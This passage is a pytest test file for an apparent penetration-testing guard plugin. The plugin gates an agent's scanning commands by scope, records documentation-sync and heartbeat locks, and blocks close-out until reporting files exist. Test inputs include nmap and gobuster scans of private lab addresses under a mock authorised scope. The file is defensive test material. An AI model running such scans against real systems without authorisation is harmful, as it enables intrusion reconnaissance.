import importlib.util
import json
import subprocess
import sys
from datetime import UTC, datetime
from pathlib import Path
from types import SimpleNamespace

import pytest

ROOT = Path(__file__).resolve().parent.parent

# Make `guard.*` resolvable (mirrors how the CLI adds scripts/ to sys.path).
sys.path.insert(0, str(ROOT / "scripts"))

_PLATFORM_SCOPE = """
targets:
  ip_addresses: ["10.10.10.10"]
  in_scope_urls: []
exclusions: {}
rules_of_engagement:
  allowed_actions: [recon, vuln-research, exploitation]
  forbidden_actions: []
engagement:
  name: e2e-test
  date: "2026-07-08"
  type: authorised-pentest
  client: test
"""


def _load_sub(name, path):
    spec = importlib.util.spec_from_file_location("vgpkg." + name, path)
    mod = importlib.util.module_from_spec(spec)
    mod.__package__ = "vgpkg"
    sys.modules["vgpkg." + name] = mod
    spec.loader.exec_module(mod)
    return mod


# Load the plugin as a real package so `from . import utils` resolves.
_PLUGIN = ROOT / "plugins/violin_guard"
_PKG = importlib.util.spec_from_file_location("vgpkg", _PLUGIN / "__init__.py")
pkg = importlib.util.module_from_spec(_PKG)
pkg.__path__ = [str(_PLUGIN)]
pkg.__package__ = "vgpkg"
sys.modules["vgpkg"] = pkg

UTILS = _load_sub("utils", _PLUGIN / "utils.py")
TOOLS = _load_sub("tools", _PLUGIN / "tools.py")

from guard import sync as sync_state  # noqa: E402
from guard.bootstrap import (  # noqa: E402
    check_bootstrap,
    init_engagement,
)
from guard.command import _check_command_core  # noqa: E402
from guard.core import validate_scope_data  # noqa: E402
from guard.record import _history_staleness_guard  # noqa: E402
from violin_guard import cmd_exec_burst  # noqa: E402


def _cp(code, out="", err=""):
    """A fake CompletedProcess-like object returned by monkeypatched subprocess.run."""
    return lambda *a, **k: _FakeProc(code, out, err)


class _FakeProc:
    """Stand-in for subprocess.CompletedProcess used by monkeypatched run_guard."""

    def __init__(self, returncode, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def _patch(monkeypatch, proc):
    monkeypatch.setattr(subprocess, "run", proc)


@pytest.fixture(autouse=True)
def _fake_target_executor(monkeypatch):
    """Keep guard-state tests independent from installed network tools."""

    def fake_execute(command, *, eng_dir, phase, **kwargs):
        remaining = TOOLS.executor._commit_guard_state(Path(eng_dir), command, phase)
        return {
            "execution_id": "00000000-0000-0000-0000-000000000001",
            "status": "completed",
            "backend": kwargs.get("backend", "local"),
            "command": command,
            "phase": phase,
            "executed": True,
            "started_at": "2026-07-11T00:00:00Z",
            "completed_at": "2026-07-11T00:00:01Z",
            "exit_code": 0,
            "timed_out": False,
            "cancelled": False,
            "stdout_preview": "",
            "stderr_preview": "",
            "evidence_paths": {},
            "sync_required": remaining <= 0,
            "sync_credit_remaining": remaining,
        }

    monkeypatch.setattr(TOOLS.executor, "execute", fake_execute)


def _init_e2e(tmp_path, skill_file):
    """Build a guard-clean RECON engagement (scope allows vuln-research so the
    hypothesis guard is exercised) and write the skill-load marker at its
    canonical location.

    The skill-load gate requires a session-scoped marker at
    ``$ENG_DIR/state/.skill-loaded-<session-id>``; passing ``--session-id``
    makes the CLI compute that canonical path itself, so we write there. We
    also pre-mark PT-001 as in-progress so the PTT staleness guard (which BLOCKs
    until at least one PT row has moved past ``[ ]``) does not reject the very
    first recon command — this mirrors a normal SCOPING->RECON handoff.
    """
    eng = tmp_path / "10.10.10.10-2026-07-08"
    assert init_engagement(str(eng), host="10.10.10.10") == 0
    (eng / "scope" / "scope.yaml").write_text(_PLATFORM_SCOPE, encoding="utf-8")
    # Canonical marker path (session-id takes precedence over --skill-loaded-file).
    # The CLI builds ``$ENG_DIR/state/.skill-loaded-<session-id>`` from --session-id,
    # so the filename suffix is the bare session label, not the full marker name.
    canonical = eng / "state" / f".skill-loaded-{skill_file.name.removeprefix('.skill-loaded-')}"
    canonical.write_text(
        f"skill-loaded: skills/pentest/SKILL.md\nsession: {skill_file.name}\n",
        encoding="utf-8",
    )
    # At least one PTT row must have advanced so the staleness guard passes.
    ptt = eng / "state" / "ptt.md"
    ptt.write_text(
        ptt.read_text(encoding="utf-8").replace("| PT-001 | [ ] |", "| PT-001 | [~] |"),
        encoding="utf-8",
    )
    return eng


def test_meta_loaded():
    # Current plugin surface: handle_* command entrypoints registered.
    for name in (
        "handle_exec",
        "handle_check_command",
        "handle_sync_done",
        "handle_record_ptt",
        "handle_record_hypothesis",
        "handle_record_history",
    ):
        assert hasattr(TOOLS, name), f"plugin must expose {name}"


def test_recon_does_not_require_hypothesis(tmp_path):
    """Recon should not require a hypothesis yet; it is the discovery phase
    that creates the evidence hypotheses later consume."""
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)

    res = _check_command_core(
        SimpleNamespace(
            command="nmap -sV 10.10.10.10",
            phase="recon",
            eng_dir=str(eng),
            scope=str(eng / "scope" / "scope.yaml"),
            skill_loaded_file=str(skill_file),
            session_id="ts",
        )
    )

    assert not res.errors
    assert not any("hypothesis guard:" in warning for warning in res.warnings)

    ts = datetime.now(UTC).strftime("%Y-%m-%d %H:%M")
    (eng / "hypotheses.md").write_text(
        (eng / "hypotheses.md").read_text(encoding="utf-8")
        + (
            f"\n### H-001: SMB share exposed\n- **Status:** Candidate\n- **Phase:** VULN_RESEARCH\n"
            f"- **Target:** 10.10.10.10\n- **Updated:** {ts} UTC\n"
        ),
        encoding="utf-8",
    )
    research = _check_command_core(
        SimpleNamespace(
            command="nmap -sV 10.10.10.10",
            phase="vuln-research",
            eng_dir=str(eng),
            scope=str(eng / "scope" / "scope.yaml"),
            skill_loaded_file=str(skill_file),
            session_id="ts",
        )
    )
    assert any("before exploitation" in warning for warning in research.warnings)


def test_fresh_history_allows_first_command(tmp_path):
    """An empty initialized history must not REVIEW-lock the first execution."""
    eng = tmp_path / "eng"
    (eng / "state").mkdir(parents=True)
    (eng / "state" / "history.md").write_text("# Command History\n", encoding="utf-8")

    result = _history_staleness_guard(eng, "nmap -sv 10.10.10.10")

    assert result.exit_code() == 0
    assert not result.errors
    assert not result.warnings
    assert any("recorded after it runs" in info for info in result.infos)


def test_first_command_does_not_require_preemptive_ptt_progress(tmp_path):
    """A pristine PTT is valid until the executor records the first command."""
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)
    ptt = eng / "state" / "ptt.md"
    ptt.write_text(
        ptt.read_text(encoding="utf-8").replace("| PT-001 | [~] |", "| PT-001 | [ ] |"),
        encoding="utf-8",
    )

    args = SimpleNamespace(
        command="nmap -sV 10.10.10.10",
        phase="recon",
        eng_dir=str(eng),
        scope=str(eng / "scope" / "scope.yaml"),
        skill_loaded_file=str(skill_file),
        session_id="ts",
    )
    first = _check_command_core(args)

    assert not first.errors
    assert any("first command may run" in info for info in first.infos)

    (eng / "state" / "history.md").write_text(
        "# Command History\n- [2026-07-12T09:00:00Z] [RECON] exit=0 `nmap -sV 10.10.10.10`\n",
        encoding="utf-8",
    )
    second = _check_command_core(args)

    assert any("PTT is stale" in error for error in second.errors)


def test_exec_blocked_without_skill_load(monkeypatch, tmp_path):
    """Skill-load gate: check-command BLOCKs when the SKILL.md marker is absent,
    and handle_exec honours that BLOCK (status 'denied')."""
    from guard.freshness import check_skill_load_gate

    # Real gate: missing marker file => BLOCK (error).
    gate = check_skill_load_gate(str(tmp_path / "no-skill-loaded"), mandatory=True)
    assert gate.errors, "missing skill-loaded marker must BLOCK"

    # handle_exec must translate a BLOCKed check-command into 'denied'.
    _patch(monkeypatch, _cp(1, "BLOCK: skill load gate not satisfied\n"))
    out = json.loads(
        TOOLS.handle_exec(
            {
                "eng_dir": str(tmp_path),
                "scope": "s",
                "phase": "recon",
                "command": "nmap 1.2.3.4",
            }
        )
    )
    assert out["status"] == "denied"
    assert "skill load gate" in out["block"][0]


def test_init_engagement_creates_compliant_artifacts(tmp_path):
    """`init-engagement` auto-creates a bootstrap-complete, guard-clean dir."""
    import yaml

    eng = tmp_path / "10.129.45.228-2026-07-08"
    rc = init_engagement(str(eng))
    assert rc == 0, "init-engagement should succeed"

    # scope.yaml present and parses clean (no REVIEW on required fields)
    scope = yaml.safe_load((eng / "scope" / "scope.yaml").read_text(encoding="utf-8"))
    assert scope["targets"]["ip_addresses"] == ["10.129.45.228"]
    assert validate_scope_data(scope).exit_code() == 0, "filled scope must be guard-clean"

    # bootstrap reports complete (exit 0) or REVIEW-only (pristine PTT is
    # legitimate on a brand-new engagement — no task touched yet).
    res = check_bootstrap(SimpleNamespace(eng_dir=str(eng), auto_repair=False))
    assert res in (0, 2), "bootstrap must be complete (or REVIEW for pristine PTT) after init"


def test_auto_repair_creates_missing_artifacts(tmp_path):
    """`check-bootstrap --auto-repair` self-heals missing required files."""
    import yaml

    eng = tmp_path / "10.10.10.5-2026-07-08"
    eng.mkdir(parents=True, exist_ok=True)  # empty dir, no artifacts

    # First pass with auto-repair creates every missing artifact.
    res = check_bootstrap(SimpleNamespace(eng_dir=str(eng), auto_repair=True))
    # After self-heal, bootstrap must be clean (0) or REVIEW-only (2).
    assert res in (0, 2), f"auto-repair should self-heal to clean, got {res}"

    # Artifacts now exist and scope is guard-clean
    for rel in ("scope/scope.yaml", "state/ptt.md", "hypotheses.md", "state/history.md"):
        assert (eng / rel).exists(), f"auto-repair should create {rel}"
    scope = yaml.safe_load((eng / "scope" / "scope.yaml").read_text(encoding="utf-8"))
    assert validate_scope_data(scope).exit_code() == 0


def test_exec_then_blocked_until_sync(monkeypatch, tmp_path):
    """End-to-end doc-sync gate (issue 1, sliding-window batch).

    After approving cmd1, the doc-sync gate arms a pending-sync but does NOT
    block cmd2 immediately — it grants a batch window of DEFAULT_SYNC_CREDIT
    consecutive target commands so the operator can iterate payloads without a
    per-command 3-call sync tax. Once the window is exhausted, the NEXT exec is
    BLOCKED (status 'denied'/'sync_required' + reason) until ptt.md / history.md
    / hypothesis-board.md are updated and sync_done clears the lock.
    """
    monkeypatch.setenv("HERMES_YOLO_MODE", "1")
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)
    d = str(eng)
    args = dict(
        eng_dir=d,
        scope=str(eng / "scope" / "scope.yaml"),
        phase="recon",
        command="nmap -sV 10.10.10.10",
        skill_loaded_file=str(skill_file),
        session_id="ts",
    )
    window = sync_state.DEFAULT_SYNC_CREDIT

    # cmd1 allowed; the enforced path arms a pending-sync on allow (rc 0 or 2).
    out1 = json.loads(TOOLS.handle_exec(args))
    assert out1["status"] in ("approved", "review"), out1
    assert out1["status"] != "denied", out1
    assert sync_state.has_pending_sync(d) is not None, "doc-sync gate must arm after approve"

    # The sliding window must permit distinct commands cmd2 .. cmd{window}
    # WITHOUT blocking. (Distinct payload variants, as in real exploitation;
    # the stuck-loop guard only fires for IDENTICAL repeats past RETRY_LIMIT.)
    for i in range(2, window + 1):
        cmd_i = f"nmap -sV 10.10.10.10 -p {i}"
        out = json.loads(TOOLS.handle_exec({**args, "command": cmd_i}))
        assert out["status"] in ("approved", "review"), f"cmd {i} within window should pass: {out}"
        assert out["status"] != "denied", f"cmd {i} within window should NOT block: {out}"

    # Window exhausted: the next exec is blocked with a sync_required reason.
    # The handler returns status 'sync_required' (NOT 'denied') with a 'hint'
    # telling the operator to run the command, update artifacts, then sync_done.
    # NOTE: the gate must NOT silently clear the lock (that was the original
    # bug) — the pending-sync lock stays armed, so the next command is blocked.
    out2 = json.loads(TOOLS.handle_exec(args))
    assert out2["status"] in ("denied", "sync_required"), out2
    assert "window exhausted" in (out2.get("raw") or "").lower() or any(
        "window exhausted" in b for b in out2.get("block", [])
    ), out2

    # Update artifacts so the prior command's ts is covered.
    pending = sync_state.has_pending_sync(d)
    assert pending is not None, "lock must still be armed before sync-done"
    pending_cmd = pending.get("command", "")
    ts = datetime.now(UTC).strftime("%Y-%m-%d %H:%M")
    ptt = eng / "state" / "ptt.md"
    ptt.write_text(
        ptt.read_text(encoding="utf-8").replace("| PT-001 | [ ] |", "| PT-001 | [~] |")
        + f"\n*Last updated: {ts} UTC*\n",
        encoding="utf-8",
    )
    hist = eng / "state" / "history.md"
    hist.write_text(
        hist.read_text(encoding="utf-8") + f"\n- [{ts}] {pending_cmd}\n", encoding="utf-8"
    )
    hb = eng / "hypotheses.md"
    hb.write_text(
        hb.read_text(encoding="utf-8")
        + (
            f"\n### H-001: seed\n- **Status:** Candidate\n- **Phase:** RECON\n"
            f"- **Target:** 10.10.10.10\n- **Updated:** {ts} UTC\n"
        ),
        encoding="utf-8",
    )

    # sync_done should now clear the lock AND refill the credit window.
    out3 = json.loads(TOOLS.handle_sync_done({"eng_dir": d}))
    assert out3["status"] == "ok", out3
    assert sync_state.has_pending_sync(d) is None, "sync-done must clear the lock"
    assert sync_state.sync_credit_remaining(d) == sync_state.DEFAULT_SYNC_CREDIT, (
        "sync-done must refill the credit window"
    )

    # Now cmd2 proceeds (a distinct command so the stuck-loop guard stays quiet).
    out4 = json.loads(TOOLS.handle_exec({**args, "command": "gobuster dir -u http://10.10.10.10"}))
    assert out4["status"] in ("approved", "review"), out4


def test_heartbeat_gate_every_n_commands(monkeypatch, tmp_path):
    """After COMMAND_INTERVAL approved commands, the NEXT violin_exec is BLOCKED
    (status 'denied' + heartbeat block reason) until heartbeat-done clears it."""
    monkeypatch.setenv("HERMES_YOLO_MODE", "1")
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)
    d = str(eng)
    interval = UTILS.COMMAND_INTERVAL
    base = dict(
        eng_dir=d,
        scope=str(eng / "scope" / "scope.yaml"),
        phase="recon",
        skill_loaded_file=str(skill_file),
        session_id="ts",
    )

    # Approve `interval` distinct commands, satisfying the doc-sync lock between each.
    for i in range(interval):
        cmd = f"nmap -p {i} 10.10.10.10"
        out = json.loads(TOOLS.handle_exec({**base, "command": cmd}))
        assert out["status"] in ("approved", "review"), f"cmd {i + 1} should pass: {out}"
        # satisfy the per-command doc-sync gate
        ts = datetime.now(UTC).strftime("%Y-%m-%d %H:%M")
        ptt = eng / "state" / "ptt.md"
        ptt.write_text(
            ptt.read_text(encoding="utf-8") + f"\n*Last updated: {ts} UTC*\n", encoding="utf-8"
        )
        hist = eng / "state" / "history.md"
        hist.write_text(hist.read_text(encoding="utf-8") + f"\n- [{ts}] {cmd}\n", encoding="utf-8")
        hb = eng / "hypotheses.md"
        hb.write_text(
            hb.read_text(encoding="utf-8") + f"\n- **Updated:** {ts} UTC\n", encoding="utf-8"
        )
        assert json.loads(TOOLS.handle_sync_done({"eng_dir": d}))["status"] == "ok"

    # The interval-th command set the heartbeat lock; the next exec must refuse.
    blocked = json.loads(TOOLS.handle_exec({**base, "command": "nmap -p 99 10.10.10.10"}))
    assert blocked["status"] == "denied", blocked
    assert any("heartbeat" in b for b in blocked["block"]), blocked

    # Clearing the heartbeat lock lets the next command proceed.
    cleared = json.loads(TOOLS.handle_heartbeat_done({"eng_dir": d}))
    assert cleared["status"] == "ok"
    resumed = json.loads(TOOLS.handle_exec({**base, "command": "nmap -p 99 10.10.10.10"}))
    assert resumed["status"] in ("approved", "review"), resumed


def test_message_tick_triggers_heartbeat(monkeypatch, tmp_path):
    """violin_message_tick increments; on MESSAGE_INTERVAL it sets the heartbeat
    lock (status 'review' + 'heartbeat triggered' in raw) so the next
    violin_exec is BLOCKED."""
    eng = tmp_path / "10.10.10.10-2026-07-08"
    assert init_engagement(str(eng), host="10.10.10.10") == 0
    (eng / "scope" / "scope.yaml").write_text(_PLATFORM_SCOPE, encoding="utf-8")
    d = str(eng)
    interval = UTILS.MESSAGE_INTERVAL

    last = None
    for _ in range(interval):
        last = json.loads(TOOLS.handle_message_tick({"eng_dir": d}))
    assert last["status"] == "review", last  # interval hit -> heartbeat pending
    assert "heartbeat triggered" in last["raw"], last

    # With a heartbeat lock set (no command ever ran), exec must refuse.
    blocked = json.loads(
        TOOLS.handle_exec(
            {
                "eng_dir": d,
                "scope": str(eng / "scope" / "scope.yaml"),
                "phase": "recon",
                "command": "nmap 1.2.3.7",
            }
        )
    )
    assert blocked["status"] == "denied"
    assert any("heartbeat" in b for b in blocked["block"]), blocked


def test_resolve_eng_dir_converges_all_forms():
    """resolve_eng_dir makes every caller form land on the SAME absolute tree.

    Root-cause fix (issue 1): the skill historically passed a relative
    ``engagements/<host>-<date>`` while the plugin resolved against CWD, so the
    two trees diverged. Every form below must resolve to ENG_ROOT/<host>-<date>.
    """
    from pathlib import Path

    from guard.core import ENG_ROOT, resolve_eng_dir

    host = "10.129.46.56-2026-07-08"
    expected = str(ENG_ROOT / host)

    assert resolve_eng_dir(None) == str(ENG_ROOT)
    assert resolve_eng_dir("") == str(ENG_ROOT)
    assert resolve_eng_dir(host) == expected
    assert resolve_eng_dir(f"engagements/{host}") == expected
    assert resolve_eng_dir(Path(f"engagements/{host}")) == expected
    # An absolute path is passed through unchanged (normalize for Windows).
    abs_path = str((Path.cwd() / host).resolve())
    assert resolve_eng_dir(abs_path) == abs_path
    # A path already under ENG_ROOT is returned as-is (no double-nesting).
    assert resolve_eng_dir(str(ENG_ROOT / host)) == expected


def test_has_pending_sync_self_heals_orphaned_lock(tmp_path):
    """Root-cause fix (issue 2): a pending-sync lock in a tree where NOTHING was
    ever run (no state/history.md) is a leftover from a prior session that was
    released but never executed — it must be cleared and treated as non-pending,
    instead of wedging every later session. Crucially, the NORMAL pending window
    (command approved but record-history not yet called, so history.md does exist
    and will contain the command shortly) must NOT be cleared."""
    from guard import sync as s

    # ---- Incident case: a tree with an orphaned lock but no history.md. ----
    eng = tmp_path / "10.10.10.10-2026-07-08"
    eng.mkdir(parents=True)
    (eng / "state").mkdir()
    (eng / "scope").mkdir()
    (eng / "evidence").mkdir()
    ptt = eng / "state" / "ptt.md"
    ptt.write_text("*Last updated: 2026-07-08 19:29 UTC*\n", encoding="utf-8")
    # A stale lock with no history.md at all -> self-heal to None.
    s.mark_pending_sync(str(eng), "nmap -p- 10.10.10.10", "recon")
    assert not (eng / "state" / "history.md").exists()
    assert s.has_pending_sync(str(eng)) is None, "orphaned lock in empty tree must self-heal"
    assert not (eng / "state" / ".violin_pending_sync.json").exists(), (
        "orphaned lock file must be cleared"
    )

    # A GENUINE pending sync (history.md exists, command will be recorded there)
    # must still return the record and NOT be cleared.
    (eng / "state" / "history.md").write_text(
        "- [2026-07-08T19:29:15Z] `nmap -p- 10.10.10.10`\n", encoding="utf-8"
    )
    s.mark_pending_sync(str(eng), "nmap -p- 10.10.10.10", "recon")
    rec = s.has_pending_sync(str(eng))
    assert rec is not None and rec["command"] == "nmap -p- 10.10.10.10"

    # Corrupt / unreadable lock -> cleared, returns None.
    lock = eng / "state" / ".violin_pending_sync.json"
    lock.write_text("{not valid json", encoding="utf-8")
    assert s.has_pending_sync(str(eng)) is None
    assert not lock.exists()


def _build_reporting_eng(tmp_path):
    """A guard-clean recon engagement missing ALL close-out artifacts."""
    eng = tmp_path / "10.10.10.99-2026-07-08"
    assert init_engagement(str(eng), host="10.10.10.99") == 0
    (eng / "scope" / "scope.yaml").write_text(_PLATFORM_SCOPE, encoding="utf-8")
    ptt = eng / "state" / "ptt.md"
    ptt.write_text(
        ptt.read_text(encoding="utf-8").replace("| PT-001 | [ ] |", "| PT-001 | [x] |"),
        encoding="utf-8",
    )
    return eng


def test_closeout_blocks_missing_reporting_artifacts(monkeypatch, tmp_path):
    """REPORTING with no report.md / phase-summary / CVSS / Research Log must
    BLOCK (exit 1) — i.e. NOT be auto-approved under --yolo."""
    from guard.closeout import check_closeout

    eng = _build_reporting_eng(tmp_path)
    res = check_closeout(str(eng), "REPORTING", "nmap -sV 10.10.10.99")
    assert res.errors, "missing reporting artifacts must BLOCK (exit 1)"
    assert res.exit_code() == 1


def test_closeout_yolo_cannot_approve(monkeypatch, tmp_path):
    """Under HERMES_YOLO_MODE=1, handle_check_command must DENY a close-out
    exit-1 (unlike exit-2 warnings which it auto-approves)."""
    eng = _build_reporting_eng(tmp_path)
    d = str(eng)
    monkeypatch.setenv("HERMES_YOLO_MODE", "1")
    out = json.loads(
        TOOLS.handle_check_command(
            {
                "eng_dir": d,
                "scope": str(eng / "scope" / "scope.yaml"),
                "phase": "REPORTING",
                "command": "search_files $ENG_DIR/evidence",
            }
        )
    )
    assert out["status"] == "block", (
        f"yolo must NOT approve a close-out block (got {out['status']}): {out}"
    )
    assert out["status"] != "ok", f"yolo must NOT auto-approve a close-out block: {out}"
    assert any("close-out gate" in b for b in out["block"]), out


def test_closeout_permits_artifact_creation(monkeypatch, tmp_path):
    """The exact command that PRODUCES reporting/report.md is exempted so the
    agent can create the file the gate requires (no deadlock)."""
    from guard.closeout import check_closeout

    eng = _build_reporting_eng(tmp_path)
    res = check_closeout(
        str(eng), "REPORTING", 'write_file path="$ENG_DIR/reporting/report.md" content="..."'
    )
    assert not res.errors, f"artifact-producing command must be exempt: {res.errors}"


def test_closeout_passes_when_artifacts_present(monkeypatch, tmp_path):
    """Once report.md, phase-summary.md, CVSS, and a Research Log entry exist,
    the REPORTING gate is clean (no block)."""
    from guard.closeout import check_closeout

    eng = _build_reporting_eng(tmp_path)
    (eng / "state" / "phase-summary.md").write_text(
        "# Phase summary\nPTT status: complete.\n", encoding="utf-8"
    )
    (eng / "reporting").mkdir(parents=True, exist_ok=True)
    (eng / "reporting" / "report.md").write_text(
        "# Report\n## Findings\n- Severity: Critical — CVSS:3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8)\n",
        encoding="utf-8",
    )
    hb = eng / "hypotheses.md"
    hb.write_text(
        hb.read_text(encoding="utf-8")
        + "\n## Research Log\n- **RES-001:** Trigger: scan -> Searched: NVD -> Result: CVE-2024-0001\n",
        encoding="utf-8",
    )
    res = check_closeout(str(eng), "REPORTING", "search_files $ENG_DIR/evidence")
    assert not res.errors, f"complete artifacts must pass: {res.errors}"


def test_retrospective_blocks_without_retro_md(monkeypatch, tmp_path):
    """RETROSPECTIVE without retrospective.md must BLOCK even with report done."""
    from guard.closeout import check_closeout

    eng = _build_reporting_eng(tmp_path)
    (eng / "state" / "phase-summary.md").write_text("# Phase summary\n", encoding="utf-8")
    (eng / "reporting").mkdir(parents=True, exist_ok=True)
    (eng / "reporting" / "report.md").write_text(
        "# Report\n## Findings\nSeverity: Critical — CVSS:3.1 AV:N/AC:L (9.8)\n", encoding="utf-8"
    )
    res = check_closeout(str(eng), "RETROSPECTIVE", "search_files $ENG_DIR/evidence")
    assert res.errors, "missing retrospective.md must BLOCK"
    assert res.exit_code() == 1


# ---------------------------------------------------------------------------
# Issue 4: guard-gated add-hosts / cleanup-hosts
# ---------------------------------------------------------------------------


def _build_scope_eng(tmp_path):
    """Engagement with two in-scope IPs and one excluded IP."""
    eng = tmp_path / "eng-2026-07-08"
    (eng / "scope").mkdir(parents=True)
    (eng / "state").mkdir(parents=True)
    scope = (
        "targets:\n"
        "  ip_addresses:\n    - 10.10.10.5\n    - 10.10.10.6\n"
        "exclusions:\n  ip_addresses:\n    - 10.10.10.99\n"
    )
    (eng / "scope" / "scope.yaml").write_text(scope, encoding="utf-8")
    return eng


def test_add_hosts_accepts_in_scope(tmp_path):
    from guard.command import add_hosts

    eng = _build_scope_eng(tmp_path)
    rc = add_hosts(
        SimpleNamespace(
            eng_dir=str(eng),
            entry=[["10.10.10.5", "web01"], ["10.10.10.6", "db01"]],
            scope=str(eng / "scope" / "scope.yaml"),
        )
    )
    assert rc == 0, "in-scope entries should be accepted"
    text = (eng / "state" / "hosts.allowed").read_text(encoding="utf-8")
    assert "10.10.10.5\tweb01" in text
    assert "10.10.10.6\tdb01" in text
    # idempotent re-add
    rc2 = add_hosts(
        SimpleNamespace(
            eng_dir=str(eng),
            entry=[["10.10.10.5", "web01"]],
            scope=str(eng / "scope" / "scope.yaml"),
        )
    )
    assert rc2 == 0
    assert (eng / "state" / "hosts.allowed").read_text(encoding="utf-8").count("10.10.10.5") == 1


def test_add_hosts_blocks_out_of_scope_and_excluded(tmp_path):
    from guard.command import add_hosts

    eng = _build_scope_eng(tmp_path)
    rc = add_hosts(
        SimpleNamespace(
            eng_dir=str(eng),
            entry=[["10.10.10.7", "evil"]],
            scope=str(eng / "scope" / "scope.yaml"),
        )
    )
    assert rc == 1, "out-of-scope IP must be BLOCKED"
    rc = add_hosts(
        SimpleNamespace(
            eng_dir=str(eng),
            entry=[["10.10.10.99", "excl"]],
            scope=str(eng / "scope" / "scope.yaml"),
        )
    )
    assert rc == 1, "excluded IP must be BLOCKED"
    rc = add_hosts(
        SimpleNamespace(
            eng_dir=str(eng), entry=[["notanip", "x"]], scope=str(eng / "scope" / "scope.yaml")
        )
    )
    assert rc == 1, "invalid IP must be BLOCKED"
    assert not (eng / "state" / "hosts.allowed").exists(), "no file must be written on BLOCK"


def test_cleanup_hosts_removes_entries(tmp_path):
    from guard.command import add_hosts, cleanup_hosts

    eng = _build_scope_eng(tmp_path)
    add_hosts(
        SimpleNamespace(
            eng_dir=str(eng),
            entry=[["10.10.10.5", "web01"], ["10.10.10.6", "db01"]],
            scope=str(eng / "scope" / "scope.yaml"),
        )
    )
    rc = cleanup_hosts(SimpleNamespace(eng_dir=str(eng), ip=["10.10.10.5"]))
    assert rc == 0
    text = (eng / "state" / "hosts.allowed").read_text(encoding="utf-8")
    assert "10.10.10.5" not in text
    assert "10.10.10.6" in text


def test_cleanup_hosts_missing_file_errors(tmp_path):
    from guard.command import cleanup_hosts

    eng = _build_scope_eng(tmp_path)
    rc = cleanup_hosts(SimpleNamespace(eng_dir=str(eng), ip=["10.10.10.5"]))
    assert rc == 1, "cleanup on absent allow-list must error"


# ---------------------------------------------------------------------------
# Issue 2: record_ptt --create (auto-create phase section + placeholder replace)
# ---------------------------------------------------------------------------


def _init_plain_eng(tmp_path):
    """Build a minimal engagement with the canonical PTT template."""
    eng = tmp_path / "eng-2026-07-08"
    (eng / "scope").mkdir(parents=True)
    (eng / "state").mkdir(parents=True)
    tpl = ROOT / "skills" / "pentest" / "templates" / "ptt.md"
    (eng / "state" / "ptt.md").write_text(tpl.read_text(encoding="utf-8"), encoding="utf-8")
    (eng / "scope" / "scope.yaml").write_text(_PLATFORM_SCOPE, encoding="utf-8")
    return eng


def test_record_ptt_create_in_range_id(tmp_path):
    from guard.record import record_ptt

    eng = _init_plain_eng(tmp_path)
    rc = record_ptt(
        SimpleNamespace(
            eng_dir=str(eng),
            id="PT-026",
            status="[ ]",
            note="",
            create=True,
            task="Run nmap top-1000",
            phase="",
            evidence="",
        )
    )
    assert rc == 0, "create in-range id should succeed"
    text = (eng / "state" / "ptt.md").read_text(encoding="utf-8")
    assert "PT-026" in text
    # landed inside the RECON section
    recon_pos = text.index("## Phase: RECON")
    blocked_pos = text.index("## Blocked / Deferred Tasks")
    assert text.index("PT-026") > recon_pos and text.index("PT-026") < blocked_pos


def test_record_ptt_create_blocked_section_placeholder(tmp_path):
    from guard.record import record_ptt

    eng = _init_plain_eng(tmp_path)
    rc = record_ptt(
        SimpleNamespace(
            eng_dir=str(eng),
            id="PT-070",
            status="[ ]",
            note="",
            create=True,
            task="Blocked: awaiting auth",
            phase="",
            evidence="",
        )
    )
    assert rc == 0, "create out-of-range id should land in Blocked section"
    text = (eng / "state" / "ptt.md").read_text(encoding="utf-8")
    assert "PT-070" in text
    assert "(none yet)" not in text, "placeholder must be replaced"
    blocked_pos = text.index("## Blocked / Deferred Tasks")
    assert text.index("PT-070") > blocked_pos


def test_record_ptt_create_requires_task(tmp_path):
    from guard.record import record_ptt

    eng = _init_plain_eng(tmp_path)
    rc = record_ptt(
        SimpleNamespace(
            eng_dir=str(eng),
            id="PT-026",
            status="[ ]",
            note="",
            create=True,
            task="",
            phase="",
            evidence="",
        )
    )
    assert rc == 1, "create without --task must error"


# ---------------------------------------------------------------------------
# Local interpreters / shell built-ins are NOT target-touching commands
# (issue: `cd engagements/10.10.10.10/...` and `python3 chain.py` were flagged
# "unclassified tool against detected target(s)" and armed the doc-sync /
# heartbeat gate, trapping the operator in a sync loop).
# ---------------------------------------------------------------------------

from guard.core import LOCAL_TOOLS, command_leading_tool  # noqa: E402
from violin_guard import check_command_enforced  # noqa: E402


def test_local_tools_not_target_touching():
    """LOCAL_TOOLS must include the operators' local interpreters built-ins,
    and command_leading_tool must surface the basename correctly."""
    for t in ("cd", "ls", "python3", "python", "bash", "pwsh"):
        assert t in LOCAL_TOOLS, f"{t} must be a LOCAL_TOOL"
    assert command_leading_tool("cd engagements/10.10.10.10/foo") == "cd"
    assert command_leading_tool("python3 chain3.py") == "python3"
    # a host-shaped token inside the args of a local tool does NOT make the
    # leading tool into a network tool
    assert command_leading_tool("python3 10.10.10.10.py") == "python3"
    assert command_leading_tool("nmap 10.10.10.10") == "nmap"


def test_local_tool_does_not_arm_pending_sync(monkeypatch, tmp_path):
    """After an approved local command (cd / python3) inside an engagement,
    the doc-sync / heartbeat gate must NOT be armed, so the operator is not
    forced into a sync loop for navigation / local-script commands."""
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)
    d = str(eng)
    base = dict(
        eng_dir=d,
        scope=str(eng / "scope" / "scope.yaml"),
        phase="recon",
        skill_loaded_file=str(skill_file),
        session_id="ts",
    )
    for cmd in ("cd engagements/10.10.10.10/state", "python3 chain3.py", "cd bar && python3 x.py"):
        rc = check_command_enforced(SimpleNamespace(**{**base, "command": cmd}))
        assert rc in (0, 2), f"{cmd} should be allow/review, got {rc}"
    assert sync_state.has_pending_sync(d) is None, "local tools must NOT arm the pending-sync gate"


def test_network_tool_still_arms_pending_sync(monkeypatch, tmp_path):
    """A real target-touching command (nmap) must still arm the gate so the
    doc-sync discipline is preserved."""
    skill_file = tmp_path / ".skill-loaded-ts"
    eng = _init_e2e(tmp_path, skill_file)
    d = str(eng)
    base = dict(
